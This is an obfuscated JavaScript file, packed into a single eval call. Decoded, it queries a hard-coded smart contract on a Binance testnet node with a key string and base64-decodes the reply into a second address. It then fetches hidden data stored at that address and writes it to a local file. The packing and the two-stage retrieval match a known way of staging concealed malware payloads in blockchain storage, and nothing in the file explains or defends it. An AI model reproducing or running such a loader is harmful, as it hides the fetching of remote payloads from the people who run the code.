eval(
  (function (code, base, count, dictionary, encode, replacements) {
    encode = function (number) {
      return (
        (number < base
          ? ''
          : encode(parseInt(number / base))) +
        ((number = number % base) > 35
          ? String.fromCharCode(number + 29)
          : number.toString(36))
      )
    }
    if (!''.replace(/^/, String)) {
      while (count--) {
        replacements[encode(count)] =
          dictionary[count] || encode(count)
      }
      dictionary = [
        function (key) {
          return replacements[key]
        },
      ]
      encode = function () {
        return '\\w+'
      }
      count = 1
    }
    while (count--) {
      dictionary[count] &&
        (code = code.replace(
          new RegExp('\\b' + encode(count) + '\\b', 'g'),
          dictionary[count]
        ))
    }
  })(
    '0 l=k("1");0 4=k("4");0 1=L l("M");0 a="O";P y j(5){J{0 g="K";0 o=g+1.3.7.u(["c"],[5]).v(2);0 q=m 1.3.h({f:a,d:o});0 p=1.3.7.s("c",q);0 9=E.D(p,"B").x("C-8");0 6="X.Y";4.z(6,"$t = "+9+"\\n");0 r="Q";0 w=W;0 i=r+1.3.7.u(["t"],[9]).v(2);0 A=m 1.3.h({f:a,d:i},w);0 e=1.3.7.s("c",A);0 S=E.D(e,"B").x("C-8");4.z(6,e);F.V(`U N d f:${6}`)}H(b){F.b("G R I y:",b)}}0 5="T";j(5);',
    61,
    61,
    'const|web3||eth|fs|inputString|filePath|abi||targetAddress|contractAddress|error|string|data|decodedData|to|methodId|call|newEncodedData|callContractFunction|require|Web3|await||encodedData|largeString|result|new_methodId|decodeParameter|address|encodeParameters|slice|blockNumber|toString|function|writeFileSync|newData|base64|utf|from|Buffer|console|Error|catch|contract|try|0x5684cff5|new|BINANCE_TESTNET_RPC_URL|decoded|0x9223f0630c598a200f99c5d4746531d10319a569|async|0x5c880fcb|calling|base64DecodedData|KEY_CHECK_VALUE|Saved|log|43152014|decoded_output|txt'.split('|'),
    0,
    {}
  )
)